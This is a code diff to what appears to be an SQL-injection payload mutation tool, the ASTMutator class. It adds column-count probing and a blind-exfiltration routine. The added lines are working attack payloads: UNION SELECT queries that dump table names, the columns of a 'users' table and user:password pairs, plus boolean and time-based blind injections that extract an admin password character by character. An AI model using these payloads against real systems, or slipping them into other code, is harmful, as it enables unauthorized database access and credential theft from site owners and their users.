@@ -15,7 +15,9 @@ class ASTMutator:
             "logical_alts": self._logical_equivalents,
             "inline_comments": self._inline_version_comments,
             "union_balance": self._balance_union_columns,
+            "column_discovery": self._discover_column_count,
             "junk_fill": self._junk_filling,
+            "blind_inference": self._blind_exfiltration,
             "context_aware": self._context_aware_mutation,
             "directed_bypass": self._directed_keyword_mutation,
             "micro_fragmentation": self._micro_fragmentation,
@@ -182,12 +184,39 @@ class ASTMutator:
         if "SELECT" not in original and "UNION" not in original:
             exfil_options = [
                 " UNION SELECT NULL,CONCAT(USER(),0x3a,VERSION())",
-                " AND (SELECT 1 FROM (SELECT SLEEP(1))a)", 
+                " AND (SELECT 1 FROM (SELECT SLEEP(5))a)", 
                 " UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
+                " UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273", # 'users' in hex
+                " UNION SELECT NULL,group_concat(user,0x3a,password) FROM users",
                 " UNION SELECT NULL,@@version"
             ]
             return clean_payload + random.choice(exfil_options)
         return payload
+
+    def _discover_column_count(self, payload):
+        """Probes for column count using ORDER BY / GROUP BY."""
+        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        num = random.randint(1, 15)
+        techniques = [
+            f" ORDER BY {num}",
+            f" GROUP BY {num}"
+        ]
+        return clean_payload + random.choice(techniques)
+
+    def _blind_exfiltration(self, payload):
+        """Constructs Blind SQLi patterns for Boolean/Time-based extraction."""
+        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        
+        # Patterns for probing password lengths and characters
+        targets = [
+            # Boolean-based length check
+            " AND (SELECT LENGTH(password) FROM users WHERE user=0x61646d696e)>5",
+            # Boolean-based char check
+            " AND (SELECT SUBSTR(password,1,1) FROM users WHERE user=0x61646d696e)=0x61", 
+            # Time-based conditional
+            " AND (SELECT IF(SUBSTR(password,1,1)=0x61,SLEEP(5),1) FROM users WHERE user=0x61646d696e)"
+        ]
+        return clean_payload + random.choice(targets)
 
     def _context_aware_wrap(self, payload):
         """Wraps payload based on detected context (quotes, brackets).
